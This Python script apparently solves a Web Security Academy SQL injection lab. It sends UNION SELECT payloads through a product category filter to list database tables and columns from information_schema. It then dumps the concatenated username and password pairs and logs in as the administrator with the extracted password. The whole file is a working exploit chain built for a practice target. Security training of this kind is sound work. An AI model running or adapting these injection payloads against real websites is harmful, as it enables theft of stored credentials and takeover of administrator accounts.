# usage:
# python3 3.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import re
from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        s = requests.Session()
        r = s.get(
            f"{self.url}/filter?category=Gifts'+UNION+SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables--+"
        )
        user_table = re.findall(r"(users_[\w]+)", r.text)[0]
        r = s.get(
            f"{self.url}/filter?category=Gifts'+UNION+SELECT+COLUMN_NAME,TABLE_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME+%3d+'{user_table}'--+"
        )
        username_column = re.findall(r"(username_[\w]+)", r.text)[0]
        password_column = re.findall(r"(password_[\w]+)", r.text)[0]
        r = s.get(
            f"{self.url}/filter?category=Gifts'+UNION+SELECT+CONCAT({username_column},'%3a',{password_column}),NULL+FROM+{user_table}--+"
        )
        password = re.findall(r"administrator:([\w]+)", r.text)[0]
        r = self.login("administrator", password)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
